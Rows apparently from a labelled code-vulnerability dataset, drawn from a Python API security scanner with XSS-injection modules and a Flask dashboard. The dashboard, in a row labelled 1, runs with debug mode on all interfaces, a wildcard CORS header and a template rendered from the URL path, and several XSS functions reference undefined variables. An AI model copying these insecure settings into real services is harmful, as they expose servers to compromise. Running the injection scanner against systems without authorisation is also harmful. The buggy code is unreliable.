        method = 'GET'

    result = validate_data(url, method)
    if result is False:
        print ""[-]Invalid Arguments""
        return False

    p = Process(target=modules_scan,args=(url,method,headers,body,scanid),name='module-scan')
    p.start()
    if api == ""Y"":
        return True


def scan_core(collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata,login_require):
    ''' Scan API through different engines ''' 
    if collection_type and collection_name is not None:
        parse_collection(collection_name,collection_type)
        if login_require is True:
            api_login.verify_login(parse_data.api_lst)
        msg = True
        for data in parse_data.api_lst:
            try:
                url = data['url']['raw']
            except:
                url = data['url']
            headers,method,body = data['headers'],data['method'],''
            if headers:
                try:
                    headhers = add_headers(headers)
                except:
                    pass

            if data['body'] != '':
                body = json.loads(base64.b64decode(data['body']))

            
            modules_scan(url,method,headers,body,attack)        

    else:
        print ""%s [-]Invalid Collection. Please recheck collection Type/Name %s"" %(api_logger.G, api_logger.W)
    #generate_report()

def get_arg(args=None):
        parser = argparse.ArgumentParser(description='REST API Security testing Framework')
        parser.add_argument('-c', '--collection_type',
                            help='Type of API collection',
                            default='Postman',choices=('Postman', 'Swagger'))
        parser.add_argument('-n', '--collection_name',
                            help='Type of API collection')
        parser.add_argument('-u', '--url',
                            help='URL of target API')
        parser.add_argument('-headers', '--headers',
                            help='Custom headers.Example: {""token"" : ""123""}')
        parser.add_argument('-method', '--method',
                            help='HTTP request method',
                            default='GET',choices=('GET', 'POST'))
        parser.add_argument('-b', '--body',
                            help='Request body of API')
        parser.add_argument('-l', '--loginurl',
                            help='URL of login API')
        parser.add_argument('-H', '--loginheaders',
                            help='Headers should be in a dictionary format. Example: {""accesstoken"" : ""axzvbqdadf""}')
        parser.add_argument('-d', '--logindata',
                            help='login data of API')
    

        results = parser.parse_args(args)
        if len(args) == 0:
            print ""%sAt least one argument is needed to procced.\nFor further information check help: %spython astra.py --help%s""% (api_logger.R, api_logger.G, api_logger.W)
            sys.exit(1)

        return (results.collection_type,
                results.collection_name,
                results.url,
                results.headers,
                results.method,
                results.body,
                results.loginurl,
                results.loginheaders,
                results.logindata,
                )

def main():
    collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata = get_arg(sys.argv[1:])
    if loginheaders is None:
            loginheaders = {'Content-Type' : 'application/json'}
    if collection_type and collection_name and loginurl and loginmethod and logindata:
        # Login data is given as an input. 
        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)
        login_require = False
    elif collection_type and collection_name and loginurl:
        # This will first find the given loginurl from collection and it will fetch auth token. 
        parse_collection(collection_name,collection_type)
        try:
            loginurl,lognheaders,loginmethod,logidata = api_login.parse_logindata(loginurl)
        except:
           print ""[-]%s Failed to detect login API from collection %s "" %(api_logger.R, api_logger.W)
           sys.exit(1)
        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)
        login_require = False
    elif loginurl and loginmethod:
        api_login.fetch_logintoken(loginurl,loginmethod,loginheaders,logindata)
        login_require = False
    elif collection_type and collection_name and headers:
        #Custom headers
        update_value('login','header',headers)
        login_require = False
    elif url and collection_name and headers:
        #Custom headers
        update_value('login','header',headers)
        login_require = False
    elif url:
        if headers is None:
            headers = {'Content-Type' : 'application/json'}
        if method is None:
            method = ""GET""
       
        login_require = False
    else:
        login_require = True

    if body:
        body = ast.literal_eval(body)

    # Configuring ZAP before starting a scan
    get_auth = get_value('config.property','login','auth_type')

    if collection_type and collection_name is not None:
        scan_core(collection_type,collection_name,url,headers,method,body,loginurl,loginheaders,logindata,login_require) 
    else:
        scan_single_api(url, method, headers, body, ""False"")


if __name__ == '__main__':
    
    api_login = APILogin()
    parse_data = PostmanParser()
    api_logger = logger()
    api_logger.banner()
    main()
/n/n/nmodules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post.body)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
11,7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8,"/API/api.py/n/nimport ast
import json
import sys
import hashlib
import time

sys.path.append('../')

from flask import Flask,render_template
from flask import Response,make_response
from flask import request
from flask import Flask
from apiscan import scan_single_api
from flask import jsonify
from pymongo import MongoClient
from utils.vulnerabilities import alerts
 
app = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')
 
# Mongo DB connection 
client = MongoClient('localhost',27017)
global db
db = client.apiscan


############################# Start scan API ######################################
def generate_hash():
    # Return md5 hash value of current timestmap 
    scanid = hashlib.md5(str(time.time())).hexdigest()
    return scanid

# Start the scan and returns the message
@app.route('/scan/', methods = ['POST'])
def start_scan():
    scanid = generate_hash()
    content = request.get_json()
    try:
        name = content['appname']
        url = content['url']
        headers = content['headers']
        body = content['body']
        method = content['method']
        api = ""Y""
        scan_status = scan_single_api(url, method, headers, body, api, scanid)
        if scan_status is True:
            # Success
            msg = {""status"" : scanid}
            try:
                db.scanids.insert({""scanid"" : scanid, ""name"" : name, ""url"" : url})
            except:
                print ""Failed to update DB""
        else:
            msg = {""status"" : ""Failed""}
    
    except:
        msg = {""status"" : ""Failed""} 
    
    return jsonify(msg)


#############################  Fetch ScanID API #########################################
@app.route('/scan/scanids/', methods=['GET'])
def fetch_scanids():
    scanids = []
    records = db.scanids.find({})
    if records:
        for data in records:
            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
                if data['scanid']:
                    if data['scanid'] not in scanids:
                        scanids.append({""scanid"" : data['scanid'], ""name"" : data['name'], ""url"" : data['url']}) 
            except:
                pass

        return jsonify(scanids)
############################# Alerts API ##########################################

# Returns vulnerbilities identified by tool 
def fetch_records(scanid):
    # Return alerts identified by the tool
    vul_list = []
    records = db.vulnerabilities.find({""scanid"":scanid})
    print ""Records are "",records
    if records:
        for data in records:  
            print ""Data is"",data
            if data['req_body'] == None:
                data['req_body'] = ""NA"" 

            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
            except:
                print ""Falied to parse""

            print ""Data"",data
            try:
                if data['id'] == ""NA"":
                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}
                    vul_list.append(all_data)

                if data['id']:
                    for vul in alerts:
                        if data['id'] == vul['id']:
                            all_data = {
                                        'url' : data['url'],
                                        'impact' : data['impact'],
                                        'name' : data['alert'],
                                        'req_headers' : data['req_headers'],
                                        'req_body' : data['req_body'],
                                        'res_headers' : data['res_headers'],
                                        'res_body' : data['res_body'],
                                        'Description' : vul['Description'],
                                        'remediation' : vul['remediation']
                                        }
                            vul_list.append(all_data)
                            break

            except:
                pass

        print vul_list
        return vul_list
        

@app.route('/alerts/<scanid>', methods=['GET'])
def return_alerts(scanid):
    print ""ScanID is "",scanid
    result = fetch_records(scanid)
    resp = jsonify(result)
    resp.headers[""Access-Control-Allow-Origin""] = ""*""
    return resp

#############################Dashboard#########################################

@app.route('/', defaults={'page': 'scan.html'})
@app.route('/<page>')
def view_dashboard(page):
    return render_template('{}'.format(page))

app.run(host='0.0.0.0', port= 8094,debug=True)
/n/n/n",1
12,27377aa23bcd9153453a2ee04c3dc33120c3b093,"modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post_request.headers)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
13,27377aa23bcd9153453a2ee04c3dc33120c3b093,"/modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post.body)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",1
14,adf60251870f581f368cfd5a6d5e0337e9ba4c76,"modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
